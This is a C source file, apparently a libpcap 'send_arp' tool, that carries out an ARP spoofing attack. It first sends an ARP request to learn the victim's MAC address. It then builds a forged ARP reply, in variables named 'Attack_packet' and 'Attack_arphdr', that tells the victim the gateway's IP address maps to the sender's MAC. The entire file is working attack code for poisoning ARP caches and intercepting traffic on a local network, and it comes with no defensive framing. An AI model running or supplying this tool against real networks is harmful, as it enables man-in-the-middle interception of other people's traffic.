#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include<net/ethernet.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<arpa/inet.h>
#include<netinet/in.h>
#include"get_mac.h"
#include"get_ip.h"
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define ETHERTYPE_ARP 0x0806
typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

int main(int argc, char *argv[])
{
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "port 80";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	u_char packet[1000];		/* The actual packet */
	u_char Attack_packet[1000];		/* The actual packet */
	const u_char *p;
	int i;
	uint8_t src_ip[4], src_mac[6], dst_mac[6], ether_frame[IP_MAXPACKET];
	uint8_t dst_ip[4];
	uint8_t gate_ip[4];

	int Res;
	arp_hdr arphdr, Attack_arphdr;
	int cnt = 0;
	char dot = '.';
	if (argc != 4)
	{
		perror("Check argument! (./send_arp <interface> <sender ip> <target ip>)\n");
		return 2;
	}

	s_getMacAddress(argv[1], src_mac);
	s_getIpAddress(argv[1], src_ip);
	sscanf(argv[3], "%d.%d.%d.%d", &gate_ip[0], &gate_ip[1], &gate_ip[2], &gate_ip[3]);
	sscanf(argv[2], "%d.%d.%d.%d", &dst_ip[0], &dst_ip[1], &dst_ip[2], &dst_ip[3]);
	/* Define the device */
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	/* Find the properties for the device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	memset(packet, 0, sizeof(packet));
	struct ether_header* ehP = (struct ether_header *)packet;

	ehP->ether_type = htons(ETHERTYPE_ARP);

	for (i = 0; i < 6; i++) {
		ehP->ether_dhost[i] = 0xff;
		ehP->ether_shost[i] = src_mac[i];
		arphdr.sender_mac[i] = src_mac[i];
		arphdr.target_mac[i] = 0x00;
	}

	arphdr.htype = htons(1);
	arphdr.ptype = htons(ETH_P_IP);
	arphdr.hlen = 6;
	arphdr.plen = 4;
	arphdr.opcode = htons(ARP_REQUEST);
	for (i = 0; i < 4; i++) {
		arphdr.sender_ip[i] = src_ip[i];
		arphdr.target_ip[i] = dst_ip[i];
	}

	memcpy(packet, ehP, sizeof(ehP));
	memcpy(packet + 14, &arphdr, sizeof(arphdr));

	if (pcap_sendpacket(handle, packet, 42) != 0)
	{
		printf("error");
	}

	while ((Res = pcap_next_ex(handle, &header, &p)) >= 0)
	{
		if (Res == 0)
			continue;

		struct ether_header* eh = (struct ether_header *)p;
		if (eh->ether_type == htons(ETHERTYPE_ARP) && eh->ether_dhost[0] == ehP->ether_shost[0] && eh->ether_dhost[1] == ehP->ether_shost[1] && eh->ether_dhost[2] == ehP->ether_shost[2] && eh->ether_dhost[3] == ehP->ether_shost[3] && eh->ether_dhost[4] == ehP->ether_shost[4] && eh->ether_dhost[5] == ehP->ether_shost[5])
		{
			for (i = 0; i < 6; i++)
				dst_mac[i] = eh->ether_shost[i];
			break;
		}
		else
		{
			printf("Failed. Try again\n");
			return -1;
		}

	}

	pcap_close(handle);
	////////////////////////////////////////
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	memset(packet, 0, sizeof(packet));

	struct ether_header* Attack_ehP = (struct ether_header *)Attack_packet;

	Attack_ehP->ether_type = htons(ETHERTYPE_ARP);

	for (i = 0; i < 6; i++) {
		Attack_ehP->ether_dhost[i] = dst_mac[i];
		Attack_arphdr.target_mac[i] = dst_mac[i];

	}
	for (i = 0; i < 6; i++) {
		Attack_ehP->ether_shost[i] = src_mac[i];
		Attack_arphdr.sender_mac[i] = src_mac[i];
	}
	Attack_arphdr.htype = htons(1);
	Attack_arphdr.ptype = htons(ETH_P_IP);
	Attack_arphdr.hlen = 6;
	Attack_arphdr.plen = 4;
	Attack_arphdr.opcode = htons(ARP_REPLY);
	for (i = 0; i < 4; i++) {
		Attack_arphdr.sender_ip[i] = gate_ip[i];//
		Attack_arphdr.target_ip[i] = dst_ip[i];
	}

	memcpy(Attack_packet, Attack_ehP, sizeof(Attack_ehP));
	memcpy(Attack_packet + 14, &Attack_arphdr, sizeof(Attack_arphdr));

	if (pcap_sendpacket(handle, Attack_packet, 42) != 0)
	{
		printf("error");
	}
	else
		printf("clear\n");

	pcap_close(handle);
	return(0);
}

